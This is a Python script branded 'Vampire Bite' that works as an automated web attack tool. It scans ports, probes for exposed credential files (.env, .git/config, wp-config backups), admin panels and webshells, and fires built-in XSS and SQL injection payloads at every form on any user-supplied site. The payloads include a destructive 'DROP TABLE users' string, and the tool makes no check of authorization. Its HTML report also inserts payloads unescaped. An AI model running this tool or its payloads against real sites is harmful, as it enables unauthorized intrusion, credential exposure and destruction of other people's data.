# Author: LORD VAMPIRE (Team Lord)

import subprocess
import sys
import os
import json
import re
import socket
import time
import random
import threading
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

def auto_install(pkg):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
        return True
    except:
        return False

def is_package_installed(package_name):
    try:
        __import__(package_name)
        return True
    except ImportError:
        return False

def check_deps():
    deps = ["requests", "colorama", "bs4"]
    for d in deps:
        if d == "bs4":
            if not is_package_installed("bs4"):
                auto_install("beautifulsoup4")
        else:
            if not is_package_installed(d):
                auto_install(d)

check_deps()

import requests
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup

init(autoreset=True)

class PayloadGenerator:
    @staticmethod
    def generate_xss():
        payloads = [
            "<script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<svg/onload=alert(1)>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "{{constructor.constructor('alert(1)')()}}",
            "<div ng-app><div ng-click=alert('XSS')>click</div></div>",
            "<video><source onerror=alert('XSS')>",
            "<details ontoggle=alert('XSS')><summary>click</summary></details>",
        ]
        return list(dict.fromkeys(payloads))
    
    @staticmethod
    def generate_sqli():
        payloads = [
            "'", "''", "\"", "' OR '1'='1", "' OR 1=1--",
            "' UNION SELECT NULL--", "' AND SLEEP(5)--", "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--", "' OR pg_sleep(5)--",
            "' UNION SELECT @@version--", "' UNION SELECT user()--",
            "'; DROP TABLE users--", "admin' --", "admin' OR '1'='1",
        ]
        return list(dict.fromkeys(payloads))


class VampireBiteComplete:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = {
            "target": "",
            "ip": "",
            "scan_time": "",
            "duration": 0,
            "open_ports": [],
            "web_server": "",
            "technologies": [],
            "security_headers": {},
            "sensitive_files": [],
            "admin_panels": [],
            "open_directories": [],
            "backdoors": [],
            "xss_vulnerable": [],
            "sql_vulnerable": [],
            "forms_found": []
        }
    
    def banner(self):
        print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                  ║
║   ██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗     ██████╗ ██╗████████╗███████╗     ║
║   ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝     ██╔══██╗██║╚══██╔══╝██╔════╝     ║
║   ██║   ██║███████║██╔████╔██║██████╔╝██║██████╔╝█████╗       ██████╔╝██║   ██║   █████╗       ║
║   ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔═══╝ ██║██╔══██╗██╔══╝       ██╔══██╗██║   ██║   ██╔══╝       ║
║    ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██║     ██║██║  ██║███████╗     ██████╔╝██║   ██║   ███████╗     ║
║     ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝   ╚═╝   ╚══════╝     ║
║                                                                                                  ║
║  {Fore.MAGENTA}🐺 VAMPIRE BITE v36.0 - COMPLETE ULTIMATE EDITION 🧛‍♂️💀{Fore.RED}                              ║
║  {Fore.GREEN}👑 Author: LORD VAMPIRE (Team Lord Leader){Fore.RED}                                             ║
║  {Fore.CYAN}⚡ Fixed Admin Detection | Port Scan | XSS/SQLi | Backdoor Hunter ⚡{Fore.RED}                     ║
╚══════════════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    def get_service_name(self, port):
        services = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
                   111:"RPC",135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",
                   993:"IMAPS",995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",
                   5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
        return services.get(port, "Unknown")
    
    def scan_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                s.close()
                return port
            s.close()
        except:
            pass
        return None
    
    def port_scan(self, ip):
        print(f"\n  {Fore.CYAN}[*] Scanning ports on {ip}...{Style.RESET_ALL}")
        ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,6379,8080,8443,27017]
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(self.scan_port, ip, p) for p in ports]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
                    print(f"      {Fore.RED}🔴 Port {result} [{self.get_service_name(result)}] OPEN{Style.RESET_ALL}")
        
        self.results["open_ports"] = open_ports
        return open_ports
    
    def detect_web_server(self, url):
        print(f"\n  {Fore.CYAN}[*] Detecting web server...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10)
            server = r.headers.get('Server', 'Unknown')
            print(f"      {Fore.GREEN}[+] Server: {server}{Style.RESET_ALL}")
            self.results["web_server"] = server
            return server
        except:
            return "Unknown"
    
    def detect_technologies(self, url):
        print(f"\n  {Fore.CYAN}[*] Detecting technologies...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10)
            text = r.text.lower()
            techs = []
            if '.php' in text:
                techs.append("PHP")
                print(f"      {Fore.GREEN}[+] PHP detected{Style.RESET_ALL}")
            if '.aspx' in text:
                techs.append("ASP.NET")
                print(f"      {Fore.GREEN}[+] ASP.NET detected{Style.RESET_ALL}")
            if 'react' in text:
                techs.append("React")
                print(f"      {Fore.GREEN}[+] React detected{Style.RESET_ALL}")
            if 'vue' in text:
                techs.append("Vue.js")
                print(f"      {Fore.GREEN}[+] Vue.js detected{Style.RESET_ALL}")
            self.results["technologies"] = techs
            return techs
        except:
            return []
    
    def check_security_headers(self, url):
        print(f"\n  {Fore.CYAN}[*] Checking security headers...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10)
            headers_list = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options', 
                           'Strict-Transport-Security', 'Content-Security-Policy']
            for h in headers_list:
                if h in r.headers:
                    print(f"      {Fore.GREEN}✅ {h}{Style.RESET_ALL}")
                    self.results["security_headers"][h] = True
                else:
                    print(f"      {Fore.RED}❌ {h}{Style.RESET_ALL}")
                    self.results["security_headers"][h] = False
        except:
            pass
    
    def find_sensitive_files(self, url):
        print(f"\n  {Fore.CYAN}[*] Looking for sensitive files...{Style.RESET_ALL}")
        files = ["/robots.txt", "/.git/config", "/.env", "/phpinfo.php", "/backup.sql", 
                "/.htaccess", "/config.php", "/wp-config.php.bak"]
        found = []
        for f in files:
            try:
                test_url = f"{url.rstrip('/')}{f}"
                r = self.session.get(test_url, timeout=3)
                if r.status_code == 200:
                    found.append({"file": f, "url": test_url})
                    print(f"      {Fore.RED}[!] Found: {f}{Style.RESET_ALL}")
                time.sleep(0.05)
            except:
                pass
        self.results["sensitive_files"] = found
        if not found:
            print(f"      {Fore.GREEN}[-] No sensitive files found{Style.RESET_ALL}")
    
    # ================================================================
    # FIXED ADMIN PANEL FINDER - NO DUPLICATES, NO HOMEPAGE
    # ================================================================
    
    def find_admin_panels(self, url):
        print(f"\n  {Fore.CYAN}[*] Hunting for real admin panels...{Style.RESET_ALL}")
        
        paths = ["/admin", "/administrator", "/wp-admin", "/login", "/cpanel", "/dashboard",
                "/admin/login", "/backend", "/controlpanel", "/manage", "/admincp", 
                "/cp", "/manager", "/webadmin", "/sysadmin", "/adminarea"]
        
        found = []
        seen_urls = set()
        
        # Get homepage content for comparison
        try:
            home_r = self.session.get(url, timeout=5)
            home_content = home_r.text
            home_length = len(home_content)
        except:
            home_content = ""
            home_length = 0
        
        for path in paths:
            try:
                test_url = f"{url.rstrip('/')}{path}"
                
                # Follow redirects but track final URL
                r = self.session.get(test_url, timeout=5, allow_redirects=True)
                final_url = r.url
                
                # Skip if redirected to homepage
                if final_url == url or final_url == url + "/" or final_url.rstrip('/') == url.rstrip('/'):
                    continue
                
                # Skip duplicate URLs
                if final_url in seen_urls:
                    continue
                
                # Check if content is different from homepage
                if len(r.text) == home_length and r.text == home_content:
                    continue
                
                seen_urls.add(final_url)
                
                # Determine panel type
                if r.status_code == 200:
                    keywords = ['login', 'username', 'password', 'admin', 'dashboard', 'control', 'panel']
                    if any(k in r.text.lower() for k in keywords):
                        found.append({"path": path, "url": final_url, "type": "Admin Panel with Login"})
                        print(f"      {Fore.RED}[✔] ADMIN PANEL: {path} → {final_url}{Style.RESET_ALL}")
                    else:
                        found.append({"path": path, "url": final_url, "type": "Admin Panel (No Login Form)"})
                        print(f"      {Fore.YELLOW}[?] Admin area: {path} → {final_url}{Style.RESET_ALL}")
                        
                elif r.status_code in [401, 403]:
                    found.append({"path": path, "url": final_url, "type": "Authentication Required"})
                    print(f"      {Fore.RED}[!] {path} - AUTH REQUIRED (Protected Admin!){Style.RESET_ALL}")
                    
                time.sleep(0.05)
            except:
                pass
        
        self.results["admin_panels"] = found
        if not found:
            print(f"      {Fore.GREEN}[-] No admin panels found{Style.RESET_ALL}")
        return found
    
    def find_open_directories(self, url):
        print(f"\n  {Fore.CYAN}[*] Looking for open directories...{Style.RESET_ALL}")
        dirs = ["/backup", "/temp", "/tmp", "/old", "/test", "/dev", "/uploads", "/files",
                "/download", "/images", "/css", "/js", "/assets", "/static", "/media",
                "/content", "/data", "/logs", "/cache", "/phpmyadmin", "/mysql"]
        found = []
        for d in dirs:
            try:
                test_url = f"{url.rstrip('/')}{d}"
                r = self.session.get(test_url, timeout=3, allow_redirects=False)
                if r.status_code == 200:
                    if 'Index of' in r.text or 'Parent Directory' in r.text:
                        found.append({"path": d, "url": test_url, "type": "Open Directory Listing"})
                        print(f"      {Fore.RED}[📁] OPEN DIRECTORY: {d}{Style.RESET_ALL}")
                    else:
                        found.append({"path": d, "url": test_url, "type": "Accessible Directory"})
                        print(f"      {Fore.YELLOW}[📁] Accessible: {d}{Style.RESET_ALL}")
                time.sleep(0.05)
            except:
                pass
        self.results["open_directories"] = found
        if not found:
            print(f"      {Fore.GREEN}[-] No open directories found{Style.RESET_ALL}")
    
    def find_backdoors(self, url):
        print(f"\n  {Fore.CYAN}[*] Hunting for backdoors...{Style.RESET_ALL}")
        backdoors = ["/shell.php", "/cmd.php", "/c99.php", "/r57.php", "/webshell.php", "/backdoor.php"]
        found = []
        for b in backdoors:
            try:
                test_url = f"{url.rstrip('/')}{b}"
                r = self.session.get(test_url, timeout=3)
                if r.status_code == 200:
                    found.append({"file": b, "url": test_url})
                    print(f"      {Fore.RED}[!] BACKDOOR FOUND: {b}{Style.RESET_ALL}")
                time.sleep(0.05)
            except:
                pass
        self.results["backdoors"] = found
        if not found:
            print(f"      {Fore.GREEN}[-] No backdoors found{Style.RESET_ALL}")
    
    def extract_forms(self, url):
        print(f"\n  {Fore.CYAN}[*] Extracting forms from {url}...{Style.RESET_ALL}")
        forms = []
        try:
            r = self.session.get(url, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', url),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                for inp in form.find_all(['input', 'textarea']):
                    inp_name = inp.get('name', '')
                    inp_type = inp.get('type', 'text')
                    if inp_name:
                        form_info['inputs'].append({'name': inp_name, 'type': inp_type})
                if form_info['inputs']:
                    forms.append(form_info)
                    
            print(f"      {Fore.GREEN}[+] Found {len(forms)} forms with {sum(len(f['inputs']) for f in forms)} inputs{Style.RESET_ALL}")
            self.results["forms_found"] = forms
            return forms
        except Exception as e:
            print(f"      {Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            return []
    
    def test_xss_on_form(self, url, form):
        vulnerabilities = []
        xss_payloads = PayloadGenerator.generate_xss()
        
        print(f"\n      {Fore.YELLOW}[*] Testing XSS on form ({len(xss_payloads)} payloads)...{Style.RESET_ALL}")
        
        for idx, payload in enumerate(xss_payloads):
            test_data = {}
            for inp in form['inputs']:
                if inp['type'] != 'submit':
                    test_data[inp['name']] = payload
            
            try:
                if form['method'] == 'POST':
                    resp = self.session.post(urljoin(url, form['action']), data=test_data, timeout=5)
                else:
                    resp = self.session.get(urljoin(url, form['action']), params=test_data, timeout=5)
                
                if payload in resp.text or payload.replace('<', '&lt;') in resp.text:
                    vulnerabilities.append({'payload': payload[:60], 'method': form['method']})
                    print(f"        {Fore.RED}[!] XSS FOUND! {payload[:50]}...{Style.RESET_ALL}")
                
                if (idx + 1) % 100 == 0:
                    print(f"        {Fore.CYAN}[*] Progress: {idx + 1}/{len(xss_payloads)} payloads tested{Style.RESET_ALL}", end='\r')
            except:
                pass
            time.sleep(0.002)
        
        print(f"\n        {Fore.CYAN}[*] Completed XSS testing{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_sqli_on_form(self, url, form):
        vulnerabilities = []
        sqli_payloads = PayloadGenerator.generate_sqli()
        sql_errors = ['mysql', 'sql syntax', 'ora-', 'postgresql', 'database error']
        
        print(f"\n      {Fore.YELLOW}[*] Testing SQLi on form ({len(sqli_payloads)} payloads)...{Style.RESET_ALL}")
        
        for idx, payload in enumerate(sqli_payloads):
            test_data = {}
            for inp in form['inputs']:
                if inp['type'] != 'submit':
                    test_data[inp['name']] = payload
            
            try:
                if form['method'] == 'POST':
                    start = time.time()
                    resp = self.session.post(urljoin(url, form['action']), data=test_data, timeout=10)
                    elapsed = time.time() - start
                else:
                    start = time.time()
                    resp = self.session.get(urljoin(url, form['action']), params=test_data, timeout=10)
                    elapsed = time.time() - start
                
                for error in sql_errors:
                    if error in resp.text.lower():
                        vulnerabilities.append({'payload': payload[:50], 'evidence': error})
                        print(f"        {Fore.RED}[!] SQLi FOUND! {payload[:40]}... (evidence: {error}){Style.RESET_ALL}")
                        break
                else:
                    if elapsed >= 4:
                        vulnerabilities.append({'payload': payload[:50], 'delay': round(elapsed, 2), 'type': 'Time-Based'})
                        print(f"        {Fore.RED}[!] TIME-BASED SQLi! Delay: {elapsed:.1f}s{Style.RESET_ALL}")
                
                if (idx + 1) % 100 == 0:
                    print(f"        {Fore.CYAN}[*] Progress: {idx + 1}/{len(sqli_payloads)} payloads tested{Style.RESET_ALL}", end='\r')
            except:
                pass
            time.sleep(0.002)
        
        print(f"\n        {Fore.CYAN}[*] Completed SQLi testing{Style.RESET_ALL}")
        return vulnerabilities
    
    def full_scan(self, target):
        self.start_time = time.time()
        self.results["target"] = target
        self.results["scan_time"] = datetime.now().isoformat()
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        parsed = urlparse(target)
        ip = parsed.hostname or target
        self.results["ip"] = ip
        
        print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        print(f"{Fore.RED}🧛‍♂️ VAMPIRE BITE COMPLETE SCAN: {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        
        # PHASE 1: PORT SCAN
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 1: PORT SCANNING                                   │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        self.port_scan(ip)
        
        # PHASE 2: WEB SERVER & TECH
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 2: WEB SERVER & TECHNOLOGY                         │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        self.detect_web_server(target)
        self.detect_technologies(target)
        
        # PHASE 3: SECURITY HEADERS
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 3: SECURITY HEADERS                               │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        self.check_security_headers(target)
        
        # PHASE 4: RECON
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 4: RECONNAISSANCE (Files, Admin, Backdoors)        │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        self.find_sensitive_files(target)
        self.find_admin_panels(target)  # FIXED VERSION
        self.find_open_directories(target)
        self.find_backdoors(target)
        
        # PHASE 5: FORMS & VULNS
        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}│  PHASE 5: FORM EXTRACTION & VULN TESTING                  │{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        forms = self.extract_forms(target)
        
        all_xss = []
        all_sqli = []
        
        if forms:
            for idx, form in enumerate(forms, 1):
                print(f"\n  {Fore.CYAN}[*] Testing Form {idx}/{len(forms)}{Style.RESET_ALL}")
                xss_results = self.test_xss_on_form(target, form)
                sqli_results = self.test_sqli_on_form(target, form)
                all_xss.extend(xss_results)
                all_sqli.extend(sqli_results)
        
        self.results["xss_vulnerable"] = all_xss
        self.results["sql_vulnerable"] = all_sqli
        self.results["duration"] = round(time.time() - self.start_time, 2)
        
        # FINAL SUMMARY
        print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        print(f"{Fore.RED}📊 VAMPIRE BITE COMPLETE SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Target: {target}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}IP: {ip}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Duration: {self.results['duration']}s{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Open Ports: {len(self.results['open_ports'])}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Web Server: {self.results['web_server']}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Technologies: {', '.join(self.results['technologies']) or 'None'}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}Sensitive Files: {len(self.results['sensitive_files'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Admin Panels: {len(self.results['admin_panels'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Open Dirs: {len(self.results['open_directories'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Backdoors: {len(self.results['backdoors'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}XSS Vulnerable: {len(all_xss)}{Style.RESET_ALL}")
        print(f"  {Fore.RED}SQLi Vulnerable: {len(all_sqli)}{Style.RESET_ALL}")
        
        # Show real admin panels found
        if self.results['admin_panels']:
            print(f"\n  {Fore.RED}📋 REAL ADMIN PANELS:{Style.RESET_ALL}")
            for ap in self.results['admin_panels']:
                print(f"    {Fore.RED}→ {ap['url']} ({ap['type']}){Style.RESET_ALL}")
        
        self.generate_html_report(target)
        print(f"\n  {Fore.GREEN}[+] HTML Report: vampire_bite_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}\n")
        
        return self.results
    
    def generate_html_report(self, target):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vampire_bite_report_{timestamp}.html"
        
        html = f"""<!DOCTYPE html>
<html><head><title>Vampire Bite Report - {target}</title>
<style>
body {{ background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }}
.container {{ max-width: 1200px; margin: auto; border: 2px solid #f00; padding: 20px; }}
h1 {{ color: #f00; text-align: center; }}
h2 {{ color: #f00; border-bottom: 2px solid #f00; }}
.critical {{ color: #f00; }}
table {{ width: 100%; border-collapse: collapse; }}
th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
th {{ background: #f00; color: #fff; }}
</style>
</head>
<body>
<div class="container">
<h1>🧛‍♂️ VAMPIRE BITE - SECURITY REPORT</h1>
<p><strong>Target:</strong> {target}</p>
<p><strong>IP:</strong> {self.results['ip']}</p>
<p><strong>Scan Time:</strong> {self.results['scan_time']}</p>
<p><strong>Duration:</strong> {self.results['duration']}s</p>

<h2>🔌 OPEN PORTS ({len(self.results['open_ports'])})</h2>
<table>
<tr><th>Port</th><th>Service</th></tr>
{''.join([f"<tr><td class='critical'>{p}</td><td>{self.get_service_name(p)}</td></tr>" for p in self.results['open_ports']])}
</table>

<h2>👑 ADMIN PANELS ({len(self.results['admin_panels'])})</h2>
{''.join([f"<div style='background:#111; padding:5px; margin:5px 0;'><a href='{a['url']}' style='color:#0f0;'>{a['url']}</a> - {a['type']}</div>" for a in self.results['admin_panels']])}

<h2>💀 BACKDOORS ({len(self.results['backdoors'])})</h2>
{''.join([f"<div style='background:#111; padding:5px; margin:5px 0;'><a href='{b['url']}' style='color:#f00;'>{b['file']}</a></div>" for b in self.results['backdoors']])}

<h2>⚠️ VULNERABILITIES</h2>
<h3>XSS ({len(self.results['xss_vulnerable'])})</h3>
<ul>{''.join([f"<li>{x['payload']}</li>" for x in self.results['xss_vulnerable'][:10]])}</ul>
<h3>SQLi ({len(self.results['sql_vulnerable'])})</h3>
<ul>{''.join([f"<li>{s['payload']}</li>" for s in self.results['sql_vulnerable'][:10]])}</ul>

<div class="footer">
<p>🐺 Created by LORD VAMPIRE | Team Lord</p>
</div>
</div>
</body></html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        return filename
    
    def run(self):
        self.banner()
        while True:
            print(f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════════════════════╗
║  {Fore.GREEN}[1]{Style.RESET_ALL} 🧛‍♂️ {Fore.RED}VAMPIRE BITE{Style.RESET_ALL} - COMPLETE SCAN (All Features)                    {Fore.RED}║
║  {Fore.GREEN}[2]{Style.RESET_ALL} 🔍 QUICK SCAN (Ports + Web Server Only)                           {Fore.RED}║
║  {Fore.GREEN}[0]{Style.RESET_ALL} 🚪 EXIT                                                        {Fore.RED}║
╚════════════════════════════════════════════════════════════════════════════════╝
""")
            choice = input(f"{Fore.RED}┌─[{Fore.YELLOW}VAMPIRE{Fore.RED}]~[{Fore.GREEN}> {Style.RESET_ALL}")
            
            if choice == "1":
                target = input(f"{Fore.CYAN}Target URL (example.com): {Style.RESET_ALL}")
                self.full_scan(target)
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "2":
                target = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}")
                if not target.startswith(('http://', 'https://')):
                    target = 'https://' + target
                ip = urlparse(target).hostname
                self.port_scan(ip)
                self.detect_web_server(target)
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "0":
                print(f"\n{Fore.RED}🧛‍♂️ VAMPIRE BITE OUT. THE WEB BLEEDS!{Style.RESET_ALL}")
                break

if __name__ == "__main__":
    hunter = VampireBiteComplete()
    hunter.run()
